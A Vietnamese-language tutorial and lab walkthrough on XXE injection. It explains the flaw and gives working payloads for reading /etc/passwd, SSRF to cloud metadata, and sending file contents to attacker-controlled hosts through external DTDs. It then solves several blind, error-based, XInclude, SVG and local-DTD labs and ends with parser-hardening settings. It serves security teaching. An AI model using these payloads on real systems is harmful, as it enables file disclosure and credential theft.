## 1. Giới thiệu

XML External Entity (XXE) Injection là một lỗ hổng bảo mật xảy ra khi ứng dụng xử lý dữ liệu XML mà không vô hiệu hóa khả năng xử lý **external entities**. Điều này cho phép attacker khai thác XML parser để truy cập tài nguyên bên ngoài như file hệ thống, endpoint nội bộ hoặc các dịch vụ mạng.

Trong nhiều trường hợp, XXE có thể dẫn đến:

- **Sensitive file disclosure**
- **Server Side Request Forgery (SSRF)**
- **Internal network scanning**
- **Denial of Service (DoS)**

Mặc dù XML đã không còn phổ biến như JSON trong các API hiện đại, nhưng nó vẫn được sử dụng rộng rãi trong nhiều hệ thống như:

- SOAP Web Services
- SAML Authentication
- XML based APIs
- Document processing systems

Do đó, XXE vẫn là một vulnerability quan trọng mà pentester cần hiểu rõ.

## 2. XML là gì?

XML (Extensible Markup Language) là một định dạng dữ liệu dạng text được thiết kế để lưu trữ và truyền dữ liệu có cấu trúc.

Ví dụ một XML document đơn giản:

```
<?xml version="1.0"?>
<user>
    <name>admin</name>
    <role>administrator</role>
</user>
```

Ứng dụng server sẽ sử dụng **XML parser** để đọc và xử lý dữ liệu này.

## 3. XXE là gì?

XML cho phép định nghĩa **entities**, tức là các biến có thể được sử dụng trong document.

Ví dụ:

```
<!DOCTYPE test [
<!ENTITY company "Security Lab">
]>

<user>
<name>&company;</name>
</user>
```

Parser sẽ thay thế `&company;` thành `Security Lab`

Ngoài entity nội bộ, XML còn hỗ trợ **external entity**, cho phép load dữ liệu từ bên ngoài.

Ví dụ:

```
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Nếu document chứa `&xxe;`

XML parser sẽ đọc nội dung file `/etc/passwd` và chèn vào document.

Đây chính là cơ chế dẫn đến **XXE Injection**.

## 4. Nguyên nhân chính

Nguyên nhân gốc rễ của lỗ hổng XXE nằm ở **cấu hình không an toàn của XML parser**, cho phép xử lý **external entity**.

Theo mặc định, nhiều XML parser hỗ trợ **Document Type Definition (DTD)** và cho phép resolve các **external entity**. Khi ứng dụng parse XML do người dùng cung cấp mà không tắt các tính năng này, attacker có thể khai báo các entity độc hại trỏ đến file nội bộ hoặc tài nguyên bên ngoài.

Lỗ hổng này thường xảy ra khi:

- DTD vẫn được bật
- External entity không bị vô hiệu hóa
- Ứng dụng parse trực tiếp XML từ user
- Không cấu hình secure features cho XML parser

## 5. Tấn công XXE cơ bản

Giả sử server nhận XML request:

```xml
<?xml version="1.0"?>
<user>
<name>test</name>
</user>
```

Attacker có thể gửi payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
<name>&xxe;</name>
</user>
```

Khi parser xử lý:

```xml
&xxe;
```

nó sẽ đọc file:

```bash
/etc/passwd
```

Server response có thể chứa:

```bash
root:x:0:0:root:/root:/bin/bash
```

## 6. Kỹ thuật tấn công XXE nâng cao

## 6.1 Blind XXE

Trong nhiều trường hợp server không trả nội dung file.

Khi đó attacker sử dụng **Out-of-band request**.

Payload:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
```

Server sẽ gửi request đến attacker server.

Attacker có thể quan sát log `GET /xxe`

## 6.2 XXE for SSRF

XXE có thể được sử dụng để truy cập dịch vụ nội bộ.

Payload:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
```

Hoặc cloud metadata:

```
http://169.254.169.254/latest/meta-data
```

Điều này có thể dẫn tới:

- Credential leak
- Cloud takeover

## 6.3 Out-of-band Data Exfiltration

Attacker có thể exfiltrate file thông qua external DTD.

Ví dụ:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
```

evil.dtd:

```xml
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

## 7. Impact

XXE có thể dẫn đến nhiều vấn đề nghiêm trọng:

**Sensitive File Disclosure**

```bash
/etc/passwd
/etc/shadow
/web.config
```

**Cloud Credential Theft**

```
AWS metadata
GCP metadata
Azure metadata
```

**SSRF**

Attacker có thể truy cập:

```
internal APIs
database admin panel
kubernetes API
```

**Denial of Service**

Ví dụ **Billion Laughs Attack**:

```xml
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;">
]>
```

Parser sẽ bị quá tải.

## 8. Cách phát hiện khi Pentest

Pentester nên test XXE khi thấy:

**XML input**

```
application/xml
text/xml
```

**Các endpoint thường dính lỗ hổng**

- SOAP APIs
- SAML
- XML upload
- Document processing

**Test payload**

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### **Lab: Blind XXE with out-of-band interaction via XML parameter entities**

Đôi khi, ứng dụng có các cơ chế phòng thủ ngăn chặn việc sử dụng các external entities thông thường (loại dùng dấu `&` như `&xxe;` bên trong các thẻ XML), hoặc ứng dụng không parse dữ liệu trả về.

Lúc này, hacker có thể sử dụng **XML Parameter Entities** (Thực thể tham số). Đặc điểm của loại entity này là:

Nó được khai báo bằng dấu phần trăm `%` thay vì dấu `&`.

Nó **chỉ có thể được gọi/sử dụng ngay bên trong phần định nghĩa DTD** (tức là nằm giữa cặp ngoặc `<!DOCTYPE foo [ ... ]>`), chứ không được dùng ở phần dữ liệu XML bên dưới.

Ví dụ cú pháp khai báo và gọi:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
```

Mục tiêu của bài lab này cũng là ép máy chủ mục tiêu gửi một request DNS/HTTP ra ngoài (Out-of-band) đến máy chủ của chúng ta (Burp Collaborator), nhưng bằng cách sử dụng Parameter Entities.

Bắt request `POST /product/stock`.

![image.png](/assets/img/20260328-xxe/image%209.png)

Chèn payload sử dụng Parameter Entity vào ngay dưới thẻ

```
<?xml version="1.0" encoding="UTF-8"?>
```

Payload cụ thể:

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://w41k7lmbz0wqdinbp48dawosyj4am0gp.oastify.com"> %xxe; ]>
```

![image.png](/assets/img/20260328-xxe/image%2010.png)

**Kết quả:**

Trên màn hình Response, ứng dụng sẽ trả về HTTP 400 Bad Request kèm theo thông báo "XML parsing error". Parser báo lỗi vì định dạng có thể bị xáo trộn, nhưng **nó đã kịp xử lý lệnh gọi `%xxe;`**.

Quay lại tab Burp Collaborator và ấn "Poll now" , sẽ thấy máy chủ mục tiêu (có IP `34.245.82.7` và `34.251.122.40`) đã thực hiện thành công các truy vấn DNS và HTTP tới địa chỉ Collaborator.

![image.png](/assets/img/20260328-xxe/image%2011.png)

Việc thấy log trả về trên Collaborator chứng minh rằng hệ thống tồn tại lỗ hổng Blind XXE thông qua Parameter Entities, và hoàn thành bài lab.

### Lab: **Exploiting blind XXE to exfiltrate data using a malicious external DTD**

Đây là kỹ thuật nâng cao nhất trong bài, kết hợp Blind XXE và việc tạo ra một file DTD độc hại bên ngoài để tuồn dữ liệu (Data Exfiltration).

Trên Exploit Server, tạo một file chứa DTD độc hại. Payload này làm 2 nhiệm vụ: đọc file `/etc/hostname` (qua entity `%file`) và nhúng nội dung file đó vào một URL để gửi ra ngoài (qua entity `%exfiltrate`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-...exploit-server.net/exploit/?x=%file;'>">
```

![image.png](/assets/img/20260328-xxe/image%2013.png)

Gửi request `POST /product/stock` sang Repeater.

![image.png](/assets/img/20260328-xxe/image%2014.png)

Chèn payload ép server tải và thực thi file DTD độc hại từ Exploit Server tấn công: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://exploit-...exploit-server.net/exploit"> %xxe;]>`.

![image.png](/assets/img/20260328-xxe/image%2015.png)

Truy cập vào Access Log của Exploit Server. Ta sẽ thấy một request GET gửi đến chứa nội dung của file `/etc/hostname` nằm trong tham số `?x=` (ví dụ: `/?x=4e2d4d095a1f`). Lấy chuỗi này submit và hoàn thành bài lab.

### **Lab: Exploiting blind XXE to retrieve data via error messages**

Trong trường hợp server chặn các kết nối OOB (Out-of-band) ra bên ngoài nhưng ứng dụng lại trả về câu báo lỗi (error message) quá chi tiết, chúng ta có thể lợi dụng chính câu thông báo lỗi này để trích xuất dữ liệu. Kỹ thuật này hoạt động bằng cách chủ động bắt parser đọc một file nhạy cảm, sau đó nhét nội dung file đó vào một đường dẫn không tồn tại để ép hệ thống văng lỗi.

Tương tự lab trước, ta sử dụng Exploit Server để lưu trữ một file DTD độc hại.

Cấu hình file DTD thực hiện 2 tác vụ. Đầu tiên, khai báo `%file` để đọc `/etc/passwd`. Tiếp theo, khai báo `%eval` chứa một external entity trỏ tới thư mục ảo kèm theo biến `%file` (ví dụ: `'file:///nonexistent/%file;'`). Gọi `%eval;` và `%error;` để kích hoạt.

![image.png](/assets/img/20260328-xxe/image%2019.png)

Chỉnh sửa request `POST /product/stock` và chèn payload gọi file DTD từ server Exploit Server:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-...exploit-server.net/exploit"> %xxe; ]>
```

![image.png](/assets/img/20260328-xxe/image%2020.png)

![image.png](/assets/img/20260328-xxe/image%2021.png)

**Kết quả:** Hệ thống báo lỗi 400 Bad Request kèm dòng thông báo "java.io.FileNotFoundException", và đằng sau thư mục ảo `/nonexistent/` chính là toàn bộ nội dung của file `/etc/passwd` (như `root:x:0:0:root:/root:/bin/bash`).

### **Lab: Exploiting XInclude to retrieve files**

Đôi khi, ứng dụng nhận dữ liệu từ người dùng (như JSON, Form-data) rồi tự động nhúng nó vào một file XML trên backend để xử lý. Lúc này, mình không thể nhét thẻ `<!DOCTYPE>` vào payload vì nó chỉ hợp lệ ở đầu document. Giải pháp ở đây là dùng **XInclude** – một tính năng chuẩn của XML cho phép chèn file tài liệu bên ngoài vào.

Quan sát request `POST /product/stock`. Tham số kiểm tra kho được truyền bằng form-urlencoded: `productId=1&storeId=1`.

![image.png](/assets/img/20260328-xxe/image%2023.png)

Thay vì gửi số `1`, ta chèn payload XInclude vào tham số `productId`. Cú pháp:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![image.png](/assets/img/20260328-xxe/image%2024.png)

Parser backend áp dụng XInclude, đọc file `/etc/passwd` và gán nó làm giá trị cho Product ID. Server sẽ trả về lỗi `Invalid product ID:` kèm nội dung file.

![image.png](/assets/img/20260328-xxe/image%2025.png)

### **Lab: Exploiting XXE via image file upload**

Tại sao up ảnh lại dính XXE? Câu trả lời nằm ở định dạng ảnh SVG. SVG bản chất là một tệp hình ảnh vector được cấu trúc và định nghĩa hoàn toàn bằng ngôn ngữ XML. Nếu hệ thống dùng các thư viện xử lý ảnh (như Apache Batik) để render ảnh SVG mà quên vô hiệu hóa external entities, nó sẽ dính lỗ hổng XXE.

![image.png](/assets/img/20260328-xxe/image%2026.png)

Tạo một file ảnh có tên `avatar_blue.svg`. Trong file này, ta khai báo thẻ

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
```

Dùng thẻ `<text>` của SVG để in biến `&xxe;` ra bức ảnh (ví dụ: `<text font-size="16" x="0" y="16">&xxe;</text>`)

Tải file SVG này lên hệ thống thông qua chức năng Comment / Upload Avatar.

### **Lab: Exploiting XXE to retrieve data by repurposing a local DTD**

Kịch bản khó nhằn này xảy ra khi kết nối OOB bị tường lửa chặn hoàn toàn, khiến cho mình không thể load file DTD từ máy chủ Exploit của mình. Lúc này, ta phải dùng chiêu "mượn gậy ông đập lưng ông": tái sử dụng (repurpose) một file DTD đã tồn tại sẵn cục bộ bên trong chính máy chủ mục tiêu.

Bắt request `POST /product/stock` và chèn phần khai báo `DOCTYPE`. Ta gọi một file DTD có sẵn phổ biến trên Linux, ví dụ: `<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`.

![image.png](/assets/img/20260328-xxe/image%2031.png)

Request được gửi thành công suy ra file DTD này tồn tại

![image.png](/assets/img/20260328-xxe/image%2032.png)

Bên trong nội dung request, ta ghi đè một entity có sẵn của file docbookx (như entity `ISOamso`). Entity bị ghi đè này sẽ mang payload độc hại chứa file `/etc/passwd` và gây ra lỗi file ảo.

![image.png](/assets/img/20260328-xxe/image%2033.png)

Khi gọi `%local_dtd;`, file DTD cục bộ được load nhưng entity bên trong nó đã bị hỏng, khiến parser văng lỗi hiển thị nội dung file nhạy cảm.

## 10. Biện pháp phòng thủ

Cách phòng chống XXE hiệu quả nhất là **disable external entities**.

**Java**

```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
```

---

**Python**

Sử dụng thư viện `defusedxml`

---

**.NET**

```
XmlReaderSettingssettings=newXmlReaderSettings();
settings.DtdProcessing=DtdProcessing.Prohibit;
```

## 11. Kết luận

XXE Injection là một lỗ hổng nguy hiểm xuất phát từ việc cấu hình XML parser không đúng cách. Mặc dù XML không còn phổ biến trong các REST APIs hiện đại, nhưng nhiều hệ thống legacy và enterprise vẫn sử dụng XML trong các giao thức quan trọng như SOAP và SAML.

Việc hiểu rõ cách XXE hoạt động giúp security researcher và pentester phát hiện và khai thác lỗ hổng hiệu quả hơn. Đồng thời, developer cũng cần cấu hình parser đúng cách để ngăn chặn external entity resolution và giảm thiểu rủi ro bảo mật.
